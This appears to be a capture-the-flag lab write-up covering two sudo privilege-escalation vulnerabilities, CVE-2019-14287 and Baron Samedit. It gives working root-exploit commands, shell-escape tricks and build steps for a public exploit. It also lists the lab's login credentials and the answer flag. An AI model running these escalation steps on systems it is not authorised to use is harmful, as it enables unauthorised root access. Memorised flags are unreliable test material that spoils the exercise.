# Section 23 — Sudo Vulnerabilities (CVE-2019-14287 & CVE-2021-3156)

> Lab: `ACADEMY-LLPE-SUDO` · `ssh htb-student@<T>` (`HTB_@cademy_stdnt!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — `/root/flag.txt` via sudo exploit | **`HTB{SuD0_e5c4l47i0n_1id}`** |

Exploited **CVE-2019-14287** (`sudo -u#-1`) to bypass `(ALL, !root)` restriction on `/bin/ncdu` → shell escape via `b` key → root → flag.

---

## Vulnerability 1 — CVE-2019-14287 (Sudo Policy Bypass) — This Lab

### Concept

Sudo < 1.8.28: when sudoers says `(ALL, !root) /some/cmd`, user ID `-1` maps to UID 0 (root) internally, bypassing the `!root` exclusion.

### Identify

```bash
sudo -V | head -1                          # < 1.8.28 = vulnerable
sudo -l                                    # look for (ALL, !root) pattern
# (ALL, !root) /bin/ncdu                   ← exploitable
```

### Exploit

```bash
sudo -u#-1 /bin/ncdu /root/
# ncdu opens as root (UID 0)
# Press 'b' → spawns root shell in current directory
cat /root/flag.txt
```
> **`-u#-1`**: sudo interprets -1 as UID 4294967295, which wraps to 0 (root). The `!root` check only blocks UID 0 explicitly, not the overflow.

**For non-interactive binaries:**
```bash
sudo -u#-1 /bin/id                         # direct root execution
sudo -u#-1 /bin/bash                       # if bash is the allowed command
```

**For interactive TUI programs (ncdu, vi, less, etc.):**
| Program | Shell escape |
|---------|-------------|
| ncdu | `b` key → spawns shell in current dir |
| vi/vim | `:!/bin/sh` |
| less | `!sh` |
| man | `!sh` |
| nmap (interactive) | `!sh` |

---

## Vulnerability 2 — CVE-2021-3156 (Baron Samedit)

### Concept

Heap-based buffer overflow in `sudoedit -s`. Affects sudo 1.8.2–1.8.31p2 and 1.9.0–1.9.5p1. Gives root from any user — no sudo privileges needed.

### Identify

```bash
sudo -V | head -1
# 1.8.31 (Ubuntu 20.04) = vulnerable
# 1.8.27 (Debian 10)    = vulnerable
# 1.9.2 (Fedora 33)     = vulnerable

# Quick test (non-destructive):
sudoedit -s /
# "sudoedit: /" = vulnerable
# "usage: sudoedit" = patched
```

### Exploit

```bash
# Clone on attacker box (target often has no internet)
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
# Transfer binary + libnss_X/ dir to target

# List available targets
./sudo-hax-me-a-sandwich
#  0) Ubuntu 18.04.5 - sudo 1.8.21, libc-2.27
#  1) Ubuntu 20.04.1 - sudo 1.8.31, libc-2.31
#  2) Debian 10.0    - sudo 1.8.27, libc-2.28

# Match target OS
cat /etc/lsb-release

# Run with the correct target ID
./sudo-hax-me-a-sandwich 1
# uid=0(root)
```

**Requirements:**
- `gcc` and `make` on target (or cross-compile with matching GLIBC)
- Match the exploit target ID to the exact OS/sudo/libc combination
- Transfer the compiled binary AND the `libnss_X/` directory together

---

## Quick Decision Tree

```
sudo -l shows entry?
├── YES: (ALL, !root) /cmd  →  CVE-2019-14287: sudo -u#-1 /cmd
├── YES: normal entry       →  GTFOBins / standard sudo abuse
└── NO sudo entry at all    →  CVE-2021-3156: Baron Samedit (no sudo privs needed)
                                Also try: CVE-2021-4034 (PwnKit), kernel exploits
```

---

## Exam / Engagement Notes

- **Check sudo version on every box**: `sudo -V | head -1`. Two critical thresholds: < 1.8.28 (CVE-2019-14287) and < 1.9.5p2 (CVE-2021-3156).
- **CVE-2019-14287** needs a sudoers entry with `(ALL, !root)` — without that pattern, it's not exploitable.
- **CVE-2021-3156** needs NO sudo privileges — works from any user. But needs gcc on target or matching GLIBC for cross-compilation.
- **Interactive programs** as sudo targets: always check GTFOBins for shell escapes (`:!sh`, `b`, `!sh`, etc.).
- The ncdu `b` key spawns a shell — useful because ncdu isn't on GTFOBins but has this built-in feature.
- If no compiler on target, try **PwnKit (CVE-2021-4034)** instead — pre-compiled versions exist.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (HTB_@cademy_stdnt!)
2. sudo -V | head -1 -> 1.8.21p2 (< 1.8.28 = CVE-2019-14287)
   sudo -l -> (ALL, !root) /bin/ncdu   ← !root bypass possible
3. sudo -u#-1 /bin/ncdu /root/
4. Press 'b' → root shell
5. cat /root/flag.txt -> HTB{SuD0_e5c4l47i0n_1id}    ✅
6. exit → 'q' to quit ncdu
```

> One line: sudoers has `(ALL, !root)` + sudo < 1.8.28 → `sudo -u#-1` bypasses restriction → shell escape from ncdu → root.
